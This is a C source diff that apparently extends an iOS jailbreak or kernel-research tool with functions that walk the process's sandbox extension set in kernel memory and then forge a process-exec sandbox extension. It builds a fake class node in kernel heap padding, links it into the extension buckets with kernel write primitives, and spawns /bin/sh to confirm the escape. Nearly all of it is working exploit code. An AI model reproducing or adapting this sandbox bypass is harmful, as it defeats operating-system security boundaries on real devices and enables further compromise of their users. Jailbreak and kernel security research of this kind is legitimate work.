@@ -2376,3 +2376,426 @@ char *kresearch_sandbox_ext_consume(const char *token) {
 
     return buf_finish();
 }
+
+// ════════════════════════════════════════════════════════════════════
+#pragma mark - Extension Set Dump + Process-Exec Bypass
+// ════════════════════════════════════════════════════════════════════
+
+char *kresearch_dump_extensions(void) {
+    buf_init();
+    buf_append("=== EXTENSION SET DUMP ===\n\n");
+
+    uint64_t self_proc = proc_self();
+    if (!self_proc) {
+        buf_append("ERROR: proc_self() returned NULL\n");
+        return buf_finish();
+    }
+    uint64_t label = proc_get_cred_label(self_proc);
+    if (!label) {
+        buf_append("ERROR: proc_get_cred_label returned NULL\n");
+        return buf_finish();
+    }
+    uint64_t sbx = label_get_sandbox(label);
+    if (!sbx) {
+        buf_append("ERROR: label_get_sandbox returned NULL\n");
+        return buf_finish();
+    }
+
+    buf_append("sandbox_label @ 0x%llx\n", sbx);
+
+    // Read the sandbox_label
+    struct sandbox_label sbx_lbl = {0};
+    kreadbuf(sbx, &sbx_lbl, sizeof(struct sandbox_label));
+    buf_append("  platform_profile: 0x%llx\n", sbx_lbl.platform_profile);
+    buf_append("  unk1:             0x%llx\n", sbx_lbl.unk1);
+    buf_append("  extension_set:    0x%llx\n", (uint64_t)sbx_lbl.extension_set);
+    buf_append("  unk3:             0x%llx\n", sbx_lbl.unk3);
+
+    uint64_t ext_set_kptr = (uint64_t)sbx_lbl.extension_set;
+    if (!ext_set_kptr) {
+        buf_append("\nERROR: extension_set is NULL\n");
+        return buf_finish();
+    }
+
+    // Read the extension_set
+    struct extension_set ext_set = {0};
+    kreadbuf(ext_set_kptr, &ext_set, sizeof(struct extension_set));
+
+    buf_append("\nextension_set @ 0x%llx\n", ext_set_kptr);
+
+    // Raw dump of extension_set (16 bucket pointers = 128 bytes)
+    uint8_t ext_set_raw[128];
+    kreadbuf(ext_set_kptr, ext_set_raw, 128);
+    buf_append("  raw extension_set (128 bytes):\n");
+    for (int row = 0; row < 128; row += 16) {
+        buf_append("    +0x%02x: ", row);
+        for (int c = 0; c < 16; c++) {
+            buf_append("%02x ", ext_set_raw[row + c]);
+        }
+        buf_append("\n");
+    }
+
+    int total_extensions = 0;
+    for (int i = 0; i < SANDBOX_EXT_NUM_BUCKETS; i++) {
+        uint64_t bucket = (uint64_t)ext_set.type_buckets[i];
+        if (!bucket) {
+            buf_append("\n  bucket[%d]: NULL (empty)\n", i);
+            continue;
+        }
+
+        buf_append("\n  bucket[%d]: 0x%llx\n", i, bucket);
+
+        // Walk the extension_class_node chain in this bucket
+        uint64_t class_node_ptr = bucket;
+        int chain_idx = 0;
+        while (class_node_ptr && chain_idx < 10) {
+            struct extension_class_node cn = {0};
+            kreadbuf(class_node_ptr, &cn, sizeof(cn));
+
+            // Raw hex dump of class_node (0x20 bytes)
+            uint8_t cn_raw[0x20];
+            kreadbuf(class_node_ptr, cn_raw, 0x20);
+            buf_append("    class_node[%d] @ 0x%llx  raw:\n      ", chain_idx, class_node_ptr);
+            for (int c = 0; c < 0x20; c++) {
+                buf_append("%02x ", cn_raw[c]);
+                if (c == 7 || c == 15 || c == 23) buf_append(" ");
+            }
+            buf_append("\n");
+
+            // Read class name from our offset (0x00)
+            char class_name[256] = {0};
+            if ((uint64_t)cn.class_name) {
+                kreadbuf((uint64_t)cn.class_name, class_name, 255);
+            }
+            buf_append("      OUR class_name(+0x00): \"%s\" (ptr=0x%llx)\n", class_name, (uint64_t)cn.class_name);
+
+            // Also try lara's class_name offset (+0x10) for comparison
+            uint64_t lara_cn_ptr = *(uint64_t *)(cn_raw + 0x10);
+            char lara_class_name[256] = {0};
+            if (lara_cn_ptr >= VM_MIN_KERNEL_ADDRESS && lara_cn_ptr <= VM_MAX_KERNEL_ADDRESS) {
+                kreadbuf(lara_cn_ptr, lara_class_name, 255);
+            }
+            buf_append("      LARA class_name(+0x10): \"%s\" (ptr=0x%llx)\n", lara_class_name, lara_cn_ptr);
+
+            buf_append("      next(+0x08):  0x%llx\n", (uint64_t)cn.next);
+            buf_append("      ext_head:     0x%llx\n", (uint64_t)cn.ext_list_head);
+            buf_append("      count:        %llu\n", cn.count);
+
+            // Walk the extension linked list
+            uint64_t ext_ptr = (uint64_t)cn.ext_list_head;
+            int ext_idx = 0;
+            while (ext_ptr && ext_idx < 20) {
+                // Raw hex dump of extension (0x60 bytes to cover lara's offsets)
+                uint8_t ext_raw[EXTENSION_RAW_SIZE];
+                kreadbuf(ext_ptr, ext_raw, EXTENSION_RAW_SIZE);
+
+                struct extension ext = {0};
+                memcpy(&ext, ext_raw, sizeof(ext));
+
+                // Read path from OUR data_ptr offset (0x18)
+                char path[256] = {0};
+                if ((uint64_t)ext.data_ptr) {
+                    kreadbuf((uint64_t)ext.data_ptr, path, 255);
+                }
+
+                // Read path from LARA's data offset (0x40)
+                uint64_t lara_data_ptr = *(uint64_t *)(ext_raw + LARA_OFF_EXT_DATA);
+                uint64_t lara_data_len = *(uint64_t *)(ext_raw + LARA_OFF_EXT_DATALEN);
+                char lara_path[256] = {0};
+                if (lara_data_ptr >= VM_MIN_KERNEL_ADDRESS && lara_data_ptr <= VM_MAX_KERNEL_ADDRESS) {
+                    kreadbuf(lara_data_ptr, lara_path, 255);
+                }
+
+                buf_append("        ext[%d] @ 0x%llx  raw:\n", ext_idx, ext_ptr);
+                for (int row = 0; row < EXTENSION_RAW_SIZE; row += 16) {
+                    buf_append("          +0x%02x: ", row);
+                    for (int c = 0; c < 16 && (row + c) < EXTENSION_RAW_SIZE; c++) {
+                        buf_append("%02x ", ext_raw[row + c]);
+                    }
+                    buf_append("\n");
+                }
+                buf_append("          OUR  data_ptr(+0x18)=\"%s\" ptr=0x%llx len=%llu\n",
+                           path, (uint64_t)ext.data_ptr, ext.path_len);
+                buf_append("          LARA data_ptr(+0x40)=\"%s\" ptr=0x%llx len=%llu\n",
+                           lara_path, lara_data_ptr, lara_data_len);
+                buf_append("          hash: 0x%llx  consumed:%d  storage:%d\n",
+                           ext.hash, ext.file.consumed, ext.file.storage_class);
+                buf_append("          st_dev:%u  st_ino:%llu  next:0x%llx\n",
+                           ext.file.st_dev, ext.st_ino, (uint64_t)ext.next);
+
+                total_extensions++;
+                ext_ptr = (uint64_t)ext.next;
+                ext_idx++;
+            }
+
+            class_node_ptr = (uint64_t)cn.next;
+            chain_idx++;
+        }
+    }
+
+    buf_append("\n=== TOTAL: %d extensions across %d buckets ===\n",
+               total_extensions, SANDBOX_EXT_NUM_BUCKETS);
+    return buf_finish();
+}
+
+char *kresearch_patch_exec(void) {
+    buf_init();
+    buf_append("=== PATCH EXEC: Adding process-exec extension ===\n\n");
+
+    uint64_t self_proc = proc_self();
+    if (!self_proc) {
+        buf_append("ABORT: proc_self() returned NULL\n");
+        return buf_finish();
+    }
+    uint64_t label = proc_get_cred_label(self_proc);
+    if (!label) {
+        buf_append("ABORT: proc_get_cred_label returned NULL\n");
+        return buf_finish();
+    }
+    uint64_t sbx = label_get_sandbox(label);
+    if (!sbx) {
+        buf_append("ABORT: label_get_sandbox returned NULL\n");
+        return buf_finish();
+    }
+
+    struct sandbox_label sbx_lbl = {0};
+    kreadbuf(sbx, &sbx_lbl, sizeof(struct sandbox_label));
+    uint64_t ext_set_kptr = (uint64_t)sbx_lbl.extension_set;
+    if (!ext_set_kptr) {
+        buf_append("ABORT: extension_set is NULL\n");
+        return buf_finish();
+    }
+    buf_append("extension_set @ 0x%llx\n", ext_set_kptr);
+
+    // Read the extension_set
+    struct extension_set ext_set = {0};
+    kreadbuf(ext_set_kptr, &ext_set, sizeof(struct extension_set));
+
+    // ── Phase 1: Find a candidate extension to clone ──
+    // We need an existing extension_class_node + extension that we can
+    // duplicate with a different class name. We look for our read-write
+    // extension (created by patch_sandbox_ext).
+    uint64_t rw_class_node_ptr = 0;
+    uint64_t rw_ext_ptr = 0;
+    int rw_bucket = -1;
+    char found_class[256] = {0};
+
+    for (int i = 0; i < SANDBOX_EXT_NUM_BUCKETS; i++) {
+        uint64_t bucket = (uint64_t)ext_set.type_buckets[i];
+        if (!bucket) continue;
+
+        struct extension_class_node cn = {0};
+        kreadbuf(bucket, &cn, sizeof(cn));
+
+        char name[256] = {0};
+        if ((uint64_t)cn.class_name) {
+            kreadbuf((uint64_t)cn.class_name, name, 255);
+        }
+
+        buf_append("  bucket[%d]: class=\"%s\"\n", i, name);
+
+        if (strstr(name, "read-write") || strstr(name, "container")) {
+            rw_class_node_ptr = bucket;
+            rw_ext_ptr = (uint64_t)cn.ext_list_head;
+            rw_bucket = i;
+            strncpy(found_class, name, 255);
+        }
+    }
+
+    if (!rw_ext_ptr) {
+        buf_append("\nABORT: No read-write or container extension found to clone\n");
+        buf_append("The filesystem sandbox escape may not be active.\n");
+        return buf_finish();
+    }
+
+    buf_append("\nUsing bucket[%d] class=\"%s\" as template\n", rw_bucket, found_class);
+    buf_append("  class_node @ 0x%llx, ext @ 0x%llx\n", rw_class_node_ptr, rw_ext_ptr);
+
+    // Read the source extension
+    struct extension src_ext = {0};
+    kreadbuf(rw_ext_ptr, &src_ext, sizeof(src_ext));
+
+    char src_path[256] = {0};
+    if ((uint64_t)src_ext.data_ptr) {
+        kreadbuf((uint64_t)src_ext.data_ptr, src_path, 255);
+    }
+    buf_append("  source path: \"%s\"\n", src_path);
+
+    // ── Phase 2: Find an empty bucket for our exec extension ──
+    int target_bucket = -1;
+    for (int i = 0; i < SANDBOX_EXT_NUM_BUCKETS; i++) {
+        if (i == rw_bucket) continue;  // don't touch our read-write bucket
+        if ((uint64_t)ext_set.type_buckets[i] == 0) {
+            target_bucket = i;
+            break;
+        }
+    }
+
+    if (target_bucket < 0) {
+        // All buckets used — find one that's not our read-write bucket
+        for (int i = 0; i < SANDBOX_EXT_NUM_BUCKETS; i++) {
+            if (i == rw_bucket) continue;
+            uint64_t bucket = (uint64_t)ext_set.type_buckets[i];
+            struct extension_class_node cn = {0};
+            kreadbuf(bucket, &cn, sizeof(cn));
+            char name[256] = {0};
+            if ((uint64_t)cn.class_name) kreadbuf((uint64_t)cn.class_name, name, 255);
+            // Skip anything that looks critical
+            if (strstr(name, "read-write") || strstr(name, "read")) continue;
+            target_bucket = i;
+            buf_append("  repurposing bucket[%d] class=\"%s\"\n", i, name);
+            break;
+        }
+    }
+
+    if (target_bucket < 0) {
+        buf_append("\nABORT: No available bucket for exec extension\n");
+        return buf_finish();
+    }
+    buf_append("\nTarget: bucket[%d]\n", target_bucket);
+
+    // ── Phase 3: Safety check — verify kwrite works on extension_set ──
+    // Write the same value back to confirm the address is writable
+    uint64_t test_addr = ext_set_kptr + offsetof(struct extension_set, type_buckets[target_bucket]);
+    uint64_t test_val = kread64(test_addr);
+    buf_append("\nSafety check: writing 0x%llx back to 0x%llx...\n", test_val, test_addr);
+    kwrite64(test_addr, test_val);
+    uint64_t verify = kread64(test_addr);
+    if (verify != test_val) {
+        buf_append("ABORT: Safety check failed (read back 0x%llx)\n", verify);
+        return buf_finish();
+    }
+    buf_append("Safety check PASSED — kwrite works on extension_set\n");
+
+    // ── Phase 4: Clone the extension for process-exec ──
+    // Strategy: reuse the source extension's data_ptr buffer.
+    // We write the exec class name into the source ext's data buffer
+    // at an offset past the existing path. Then create a new class node
+    // by writing into the target bucket's memory.
+    //
+    // Since we can't allocate new kernel heap, we use a trick:
+    // Point the target bucket at the SAME class_node as the source,
+    // but with the class name changed. This is too destructive.
+    //
+    // Better approach: Write a new class_node + extension into the
+    // source extension's padding area (ext.unk[0..3] = 32 bytes)
+    // and use that as our new extension_class_node.
+    //
+    // Actually, safest approach: overwrite the source extension's data_ptr
+    // buffer to contain BOTH the path "/" AND the class name string,
+    // then create a minimal class_node structure in the source ext's
+    // padding space.
+
+    // The source extension's data_ptr points to a buffer with "/"
+    // We'll write: "/" at +0, "com.apple.sandbox.executable" at +2
+    uint64_t path_buf = (uint64_t)src_ext.data_ptr;
+    if (!path_buf) {
+        buf_append("ABORT: source extension data_ptr is NULL\n");
+        return buf_finish();
+    }
+
+    // First, check how much space is available after the path
+    // The path is "/" (1 byte + null = 2 bytes). The buffer was
+    // originally a longer container path, so there should be space.
+    char buf_check[128] = {0};
+    kreadbuf(path_buf, buf_check, 128);
+    buf_append("  data_ptr buffer first 64 bytes:\n    ");
+    for (int i = 0; i < 64; i++) {
+        buf_append("%02x ", (uint8_t)buf_check[i]);
+        if ((i + 1) % 16 == 0) buf_append("\n    ");
+    }
+    buf_append("\n");
+
+    // Write the exec class name after the "/" path
+    // Layout: [/\0][com.apple.sandbox.executable\0]
+    const char *exec_class = "com.apple.sandbox.executable";
+    uint64_t exec_class_addr = path_buf + 2;  // right after "/"
+    buf_append("Writing exec class name at 0x%llx...\n", exec_class_addr);
+    kwritebuf(exec_class_addr, (void *)exec_class, strlen(exec_class) + 1);
+
+    // Verify the write
+    char verify_name[64] = {0};
+    kreadbuf(exec_class_addr, verify_name, 63);
+    buf_append("  verify: \"%s\"\n", verify_name);
+    if (strcmp(verify_name, exec_class) != 0) {
+        buf_append("ABORT: class name write verification failed\n");
+        return buf_finish();
+    }
+
+    // ── Phase 5: Build the class node in the source extension's padding ──
+    // The source extension has unk[4] (32 bytes of padding at offset 0x38)
+    // We'll use this space to store a minimal extension_class_node (0x20 bytes)
+    uint64_t new_cn_addr = rw_ext_ptr + offsetof(struct extension, unk[0]);
+    buf_append("\nBuilding exec class_node at 0x%llx (in extension padding)\n", new_cn_addr);
+
+    // Build the class node:
+    //   class_name → exec_class_addr
+    //   next → NULL
+    //   ext_list_head → rw_ext_ptr (reuse the SAME extension — it has "/" path)
+    //   count → 1
+    uint8_t cn_buf[0x20];
+    memset(cn_buf, 0, 0x20);
+    *(uint64_t *)(cn_buf + 0x00) = exec_class_addr;  // class_name
+    *(uint64_t *)(cn_buf + 0x08) = 0;                 // next = NULL
+    *(uint64_t *)(cn_buf + 0x10) = rw_ext_ptr;        // ext_list_head → same ext
+    *(uint64_t *)(cn_buf + 0x18) = 1;                 // count = 1
+
+    buf_append("  class_name ptr:  0x%llx\n", exec_class_addr);
+    buf_append("  ext_list_head:   0x%llx (reusing source ext)\n", rw_ext_ptr);
+
+    kwrite_zone_element(new_cn_addr, cn_buf, 0x20);
+
+    // Verify
+    struct extension_class_node verify_cn = {0};
+    kreadbuf(new_cn_addr, &verify_cn, sizeof(verify_cn));
+    buf_append("  verify class_name ptr: 0x%llx\n", (uint64_t)verify_cn.class_name);
+    buf_append("  verify ext_head ptr:   0x%llx\n", (uint64_t)verify_cn.ext_list_head);
+
+    // ── Phase 6: Link the new class node into the extension set ──
+    buf_append("\nLinking into type_buckets[%d]...\n", target_bucket);
+    uint64_t bucket_addr = ext_set_kptr + offsetof(struct extension_set, type_buckets[target_bucket]);
+    kwrite64(bucket_addr, new_cn_addr);
+
+    // Verify
+    uint64_t verify_bucket = kread64(bucket_addr);
+    buf_append("  verify bucket[%d] = 0x%llx (expected 0x%llx)\n",
+               target_bucket, verify_bucket, new_cn_addr);
+
+    if (verify_bucket != new_cn_addr) {
+        buf_append("WARNING: Bucket write may have failed!\n");
+    }
+
+    // ── Phase 7: Test ──
+    buf_append("\n=== TESTING ===\n");
+
+    pid_t pid = getpid();
+    int exec_check = sandbox_check(pid, "process-exec",
+                                   SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
+                                   "/bin/sh");
+    buf_append("sandbox_check(process-exec, /bin/sh) = %d %s\n",
+               exec_check, exec_check == 0 ? "ALLOWED!" : "DENIED");
+
+    int fork_check = sandbox_check(pid, "process-fork",
+                                   SANDBOX_CHECK_NO_REPORT);
+    buf_append("sandbox_check(process-fork) = %d %s\n",
+               fork_check, fork_check == 0 ? "ALLOWED!" : "DENIED");
+
+    // Try posix_spawn regardless
+    buf_append("\nAttempting posix_spawn(/bin/sh)...\n");
+    pid_t child = 0;
+    char *argv[] = {"/bin/sh", "-c", "echo JAILBREAK_SUCCESS", NULL};
+    extern char **environ;
+    int spawn_ret = posix_spawn(&child, "/bin/sh", NULL, NULL, argv, environ);
+    buf_append("posix_spawn returned: %d (errno=%d: %s)\n",
+               spawn_ret, spawn_ret, strerror(spawn_ret));
+
+    if (spawn_ret == 0) {
+        buf_append("*** CHILD PID: %d — SPAWN SUCCEEDED! ***\n", child);
+        int status = 0;
+        waitpid(child, &status, 0);
+        buf_append("Child exited with status: %d\n", WEXITSTATUS(status));
+    }
+
+    buf_append("\n=== PATCH EXEC COMPLETE ===\n");
+    return buf_finish();
+}
